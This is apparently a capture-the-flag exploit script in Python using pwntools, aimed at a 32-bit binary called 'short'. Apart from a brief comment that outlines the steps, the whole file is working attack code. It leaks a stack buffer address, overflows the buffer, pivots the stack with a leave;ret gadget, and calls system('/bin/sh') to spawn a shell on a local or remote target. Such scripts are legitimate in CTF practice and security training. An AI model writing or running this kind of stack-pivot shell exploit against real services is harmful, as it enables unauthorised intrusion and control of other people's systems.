'''
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)

1. leak buf_addr
2. stack overflow and stack migration to buf
3. set the stack by setting buf as appending + system_plt_addr + appending + binsh_addr + '/bin/sh\x00'
'''

from pwn import *


local = 1
url, port = "0192d5d2f17c7e588f359b49d49d29f9.lnd7.dg03.ciihw.cn", 44621
filename = "./short"
elf = ELF(filename)
# libc = ELF("./libc.so.6") 
# context(arch="amd64", os="linux")
context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    context.log_level = "debug"
    io = remote(url, port)

buffer_size = 76 + 4
leave_ret_addr = 0x08048555
gift_addr = 0x080485E6
# system_addr = 0x080485FF # 0x080485FA
system_plt_addr = elf.plt['system']
vul_addr = 0x08048611

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'your username: ', b'admin')
    io.sendlineafter(b'your password: ', b'admin123')
    io.recvuntil(b'will input this: ')
    # B()
    buf_addr = int(io.recvuntil(b'\n', drop=True), 16)
    print(buf_addr)
    # log.info('buf_addr:', hex(buf_addr))
    binsh_addr = buf_addr + 0x10
    print('binsh_addr:', hex(binsh_addr))

    payload = p32(0) + p32(system_plt_addr) + p32(0) 
    payload += p32(binsh_addr) + b'/bin/sh\x00' # /bin/sh is 8 bytes
    payload = payload.ljust(buffer_size, b'F')
    payload += p32(buf_addr) + p32(leave_ret_addr)
    print('length of payload:', hex(len(payload)), payload)
    io.sendafter(b'input your msg:\n\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
